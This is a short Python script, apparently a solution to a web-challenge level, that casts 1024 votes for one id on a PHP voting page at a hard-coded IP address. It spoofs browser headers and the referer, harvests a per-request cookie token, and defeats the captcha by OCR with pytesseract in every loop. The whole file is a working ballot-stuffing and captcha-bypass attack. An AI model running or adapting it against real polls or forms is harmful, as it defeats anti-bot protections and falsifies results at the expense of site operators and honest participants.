#!/usr/bin/python3
"""
Program that votes 1024 times for my id.
"""
import requests
from PIL import Image
import pytesseract


url = "http://158.69.76.135/level3.php"
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)\
        Gecko/20100101 Firefox/64.0',
    'referer': url
}

session = requests.session()
session.headers.update(header)

for i in range(1024):
    res = session.get(url, headers=header)

    value = res.cookies['HoldTheDoor']

    image_url = "http://158.69.76.135/captcha.php"

    with open('image_url.png', mode='wb') as file:
        file.write(session.get(image_url, headers=header).content)
    # im = Image.open('image_url.png')

    text = pytesseract.image_to_string('image_url.png', lang='eng')[:4]
    print("{}".format(text))

    params = {
        'id': '3779',
        'holdthedoor': 'submit',
        'key': value,
        'captcha': text
    }
    votes = session.post(url, data=params, headers=header)
    print(votes.status_code)
